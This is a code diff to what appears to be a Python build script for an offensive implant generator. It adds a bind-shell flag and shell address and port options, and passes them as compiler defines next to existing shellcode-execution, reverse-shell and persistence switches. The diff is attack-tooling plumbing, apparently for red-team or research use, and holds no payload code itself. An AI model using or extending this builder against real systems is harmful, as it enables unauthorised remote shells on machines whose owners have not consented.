@@ -1,4 +1,4 @@
-cimport datetime
+import datetime
 import argparse
 import binascii
 import os
@@ -47,10 +47,18 @@ parser.add_argument("-atkSc", "--loadShellcode", action="store_true",
                     help="execute shellcode")
 parser.add_argument("-atkR", "--reverseShell",action="store_true",
                     help="run a reverse shell")
+parser.add_argument("-atkBi", "--bindShell",action="store_true",
+                    help="run a bind shell")
 parser.add_argument("-revip", "--reverseIP",type=str, metavar='',
                     help="reverse shell IP")
 parser.add_argument("-revport", "--reversePort",type=str, metavar='',
                     help="reverse shell Port")
+
+parser.add_argument("-sip", "--sip",type=str,
+                    help="shell address", metavar='', default="unknown")
+parser.add_argument("-sport", "--sport",type=str,
+                    help="shell port", metavar='', default="unknown")
+
 parser.add_argument("-per", "--persistence",type=str, metavar='',
                     help="persistence mechanism (not implemented)")
 parser.add_argument("-notes", "--notes",type=str, metavar='',
@@ -121,12 +129,23 @@ if args.loadShellcode:
 #REVERSESHELL
 if args.reverseShell:
     cmd.insert(2, "-D REVERSESHELL=1")
+#BINDSHELL
+if args.bindShell:
+    cmd.insert(2, "-D BINDSHELL=1")
 #REVERSEIP
 if args.reverseIP is not None:
     cmd.insert(2, "-D REVERSEIP=\"" + args.reverseIP +"\"")
 #REVERSEPORT
 if args.reversePort is not None:
     cmd.insert(2, "-D REVERSEPORT=\"" + args.reversePort +"\"")
+
+#SHELL IP
+if args.sip != "unknown":
+    cmd.insert(2, "-D S_IP=\"" + args.sip +"\"")
+#SHELL PORT
+if args.sport != "unknown":
+    cmd.insert(2, "-D S_PORT=\"" + args.sport +"\"")
+
 #PERSIST
 if args.persistence is not None:
     cmd.insert(2, "-D PERSIST=\"" + args.persistence +"\"")
